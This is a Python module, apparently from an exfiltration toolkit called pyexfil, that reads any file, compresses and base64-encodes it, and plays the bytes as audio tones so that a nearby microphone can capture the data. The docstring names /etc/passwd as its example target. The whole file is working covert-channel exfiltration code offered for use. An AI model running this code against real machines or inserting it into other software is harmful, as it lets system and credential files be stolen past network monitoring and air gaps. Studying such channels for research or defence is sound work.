#!/usr/bin/env python3
"""
Audio-based physical exfiltration.

Encodes file bytes as audio tones played through the default output device.
A nearby microphone + listener can capture and decode.

Usage:
    from pyexfil.physical.audio.exfiltrator import AudioExfil

    a = AudioExfil()
    a.send("/etc/passwd")
"""

import sys
import math
import zlib
import base64
from typing import Callable

from pyexfil.includes.base import PhysicalModule

BITRATE = 14400


class AudioExfil(PhysicalModule):
    """Exfiltrate file data as frequency-modulated audio tones."""

    MODULE_NAME = "Audio"
    PROTOCOL    = "audio/fm-tones"

    def __init__(self, verbose: bool = False):
        super().__init__(verbose=verbose)
        self._stream  = None
        self._pyaudio = None

    def _open_stream(self):
        try:
            import pyaudio
            self._pyaudio = pyaudio.PyAudio()
            self._stream  = self._pyaudio.open(
                format=self._pyaudio.get_format_from_width(1),
                channels=1,
                rate=BITRATE,
                output=True,
            )
        except ImportError:
            raise ImportError("pyaudio is required for AudioExfil. Install it with: pip install pyaudio")

    def _close_stream(self):
        if self._stream:
            self._stream.stop_stream()
            self._stream.close()
        if self._pyaudio:
            self._pyaudio.terminate()
        self._stream  = None
        self._pyaudio = None

    def _play_tones(self, tones: bytes):
        self._open_stream()
        for i, byte_val in enumerate(tones):
            freq = byte_val * 10 or 10
            samples = bytes([
                int(math.sin(x / ((BITRATE / freq) / math.pi)) * 127 + 128)
                for x in range(256)
            ])
            self._stream.write(samples)
            if self.verbose and i % 50 == 0:
                sys.stdout.write("[Audio] Played %d bytes.\n" % i)
        self._close_stream()

    # ------------------------------------------------------------------
    # PhysicalModule interface
    # ------------------------------------------------------------------

    def _send_impl(self, data, **kwargs) -> bool:
        if isinstance(data, (str, bytes)) and not isinstance(data, bytes):
            # treat as file path
            file_path = data
            try:
                with open(file_path, "rb") as f:
                    raw = f.read()
            except IOError as e:
                sys.stderr.write("[Audio] Cannot read file: %s\n" % e)
                return False
        elif isinstance(data, bytes):
            raw = data
        else:
            try:
                with open(str(data), "rb") as f:
                    raw = f.read()
            except IOError as e:
                sys.stderr.write("[Audio] Cannot read file: %s\n" % e)
                return False

        tones = base64.b64encode(zlib.compress(raw))
        sys.stdout.write("[Audio] %d bytes after encoding.\n" % len(tones))
        self._play_tones(tones)
        return True
